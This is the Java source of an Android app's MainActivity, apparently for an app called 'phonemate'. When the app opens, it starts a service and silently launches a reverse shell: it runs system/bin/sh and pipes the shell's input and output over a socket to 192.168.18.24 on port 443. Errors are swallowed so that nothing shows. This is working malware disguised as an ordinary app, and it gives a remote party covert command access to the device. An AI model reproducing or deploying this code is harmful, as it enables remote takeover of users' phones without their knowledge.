package com.dextrotechnologies.phonemate;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //start foreground service
        startService(new Intent(this, MainService.class));

        //start rev-con
        new Thread(() -> {
            try{
                revConInit();
            } catch (Exception e){
                // Log.e("Reverse Shell Error", e.getMessage());
            }
        }).start();
    }

    public void revConInit() throws Exception {
        // create a process around the shell
        final Process process = Runtime.getRuntime().exec("system/bin/sh");

        // start a socket
        Socket socket = new Socket("192.168.18.24", 443);

        // forward streams until socket closes
        forwardStream(socket.getInputStream(), process.getOutputStream());
        forwardStream(process.getInputStream(), socket.getOutputStream());
        forwardStream(process.getErrorStream(), socket.getOutputStream());
        process.waitFor();

        // close the socket streams
        socket.getInputStream().close();
        socket.getOutputStream().close();
    }

    private static void forwardStream(final InputStream input, final OutputStream output) {
        new Thread(() -> {
            try {
                final byte[] buf = new byte[4096];
                int length;
                while ((length = input.read(buf)) != -1) {
                    if (output != null) {
                        output.write(buf, 0, length);
                        if (input.available() == 0) {
                            output.flush();
                        }
                    }
                }
            } catch (Exception e) {
                // die silently
            } finally {
                try {
                    input.close();
                    if (output != null) {
                        output.close();
                    }
                } catch (IOException e) {
                    // die silently
                }
            }
        }).start();
    }
}